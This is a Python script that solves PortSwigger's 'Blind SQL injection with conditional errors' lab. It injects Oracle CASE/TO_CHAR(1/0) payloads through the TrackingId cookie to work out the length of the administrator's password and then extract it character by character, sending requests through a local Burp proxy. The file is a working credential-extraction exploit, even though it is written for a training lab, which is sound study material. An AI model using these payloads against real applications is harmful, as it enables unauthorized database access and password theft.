# PortSwigger
# Lab: Blind SQL injection with conditional errors

import sys
import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
tracking_id = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "TrackingId": tracking_id,
    "session": session
}

# Password Characters
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']


def get_password_length(max_length):
    
    print("(+) Retrieving password length...")

    for i in range(1, max_length + 1):

        sqli_playload = "' AND (SELECT CASE WHEN LENGTH(password) = %s THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a" % (i)
        cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)

        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

        sys.stdout.write("\r" + str(i))
        sys.stdout.flush()

        if response.status_code == 500:
            return i
        
        
def get_password(password_length):    
    
    print("\r(+) Retrieving password characters...")    
    password_extracted = ""

    for i in range(1, password_length + 1):
        
        for j in range(0, len(characters)):

            sqli_playload = "' AND (SELECT CASE WHEN SUBSTR(password,%s,1) = '%s' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a" % (i, characters[j])
            cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)

            response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            sys.stdout.write('\r' + password_extracted + characters[j])
            sys.stdout.flush()

            if response.status_code == 500:
                password_extracted += characters[j]
                break


if __name__ == "__main__":     
    password_length = get_password_length(25)    
    get_password(password_length)